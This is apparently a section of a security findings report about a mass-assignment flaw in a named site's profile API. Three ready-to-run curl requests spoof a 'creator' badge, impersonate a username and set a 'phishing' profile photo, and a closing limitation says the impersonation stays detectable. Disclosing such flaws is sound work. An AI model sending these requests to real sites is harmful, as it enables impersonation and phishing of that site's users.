## 4. MASS ASSIGNMENT — PROFILE MANIPULATION

### Vulnerability
`PATCH /api/miku/7/9/me/profile` accepts and persists changes to:
- `username` — changes display name
- `photoURL` — changes profile photo (CDN URL)
- `equippedBadge` — changes displayed badge
- `banner` / `bannerURL` — changes profile banner

Fields silently dropped (server-controlled, NOT exploitable):
- `role`, `level`, `xp`, `mikuPoint`, `ownedBadges`, `isVip`, `mikuId`

# EXECUTION TRACE — Badge Spoofing
```bash
curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"equippedBadge": "creator"}'
```

# EXECUTION TRACE — Username Impersonation
```bash
curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"username": "Yanzz X MikuNime"}'
```

# EXECUTION TRACE — Phishing Photo
```bash
curl -s -X PATCH "https://panel.mikunime.web.id/api/miku/7/9/me/profile" \
  -H "Authorization: Bearer miku_[REDACTED]" \
  -H "X-Miku-Auth: vps" \
  -H "Content-Type: application/json" \
  -d '{"photoUrl": "https://cdn.jsdelivr.net/gh/teshotteshot-create/Miku@main/avatars/8mpFy9Jim2ezl7mQGA4vskmdPhw1-1787341419668.jpg"}'
```

### Limitation
Level (1), XP (0), role (user), ownedBadges ([]) remain server-controlled.
Impersonation is limited — no level/color — users can detect the fake.

